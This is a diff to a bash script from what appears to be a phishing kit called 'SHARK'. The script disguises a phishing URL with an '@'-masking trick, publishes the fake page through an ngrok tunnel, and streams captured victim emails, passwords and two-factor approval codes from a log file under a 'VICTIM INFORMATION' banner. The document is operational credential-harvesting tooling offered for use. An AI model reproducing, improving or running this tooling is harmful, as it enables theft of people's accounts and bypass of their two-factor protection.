@@ -138,6 +138,7 @@ ash() {
 	sleep 3
         final=$mask-$words@$shorter
         echo -e "\e[91m[\e[92m~\e[91m]\e[92m Your phishing url >>\e[m $final "
+	echo
         }
 
         read -p $'\e[91m[\e[92m~\e[91m]\e[93m Enter Your Choice : \e[0m' option
@@ -161,13 +162,15 @@ ash() {
 			    tput cnorm
 			    link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io") 
 			    printf "\e[91m[\e[92m*\e[91m]\e[93m Your URL >>\e[0m\e[92m %s\e[0m\n" $link
-			    echo ""                                                                                                                           
+			    echo                                                                                                                        
 			    ash 
-			    echo " "
-			    echo " "
-			    sleep 2
-			    echo -e "\e[96m<<<<<<<<<<<<<<<<<<<<<<<\e[92m VICTIM INFORMATION \e[96m>>>>>>>>>>>>>>>>>>>>>>>>>>>>>  \e[93m"  
+			    read -p $'\e[91m[\e[92m~\e[91m]\e[93m Start Phishing\e[92m(Enter) \e[93mor Close\e[92m[(Ctrl+c) :\e[m ' listner
 			    echo 
+			    echo
+			    echo -e "\e[96m=======================\e[92m VICTIM INFORMATION \e[96m====================== \e[93m"  
+			    echo 
+			    echo -e "\e[96m=======================\e[92m    SHARK © 2020    \e[96m====================== \e[92m"
+			    echo
 			    tail -f log.txt | grep -e "email" -e "pass" -e "approvals_code"
 	
                             break;
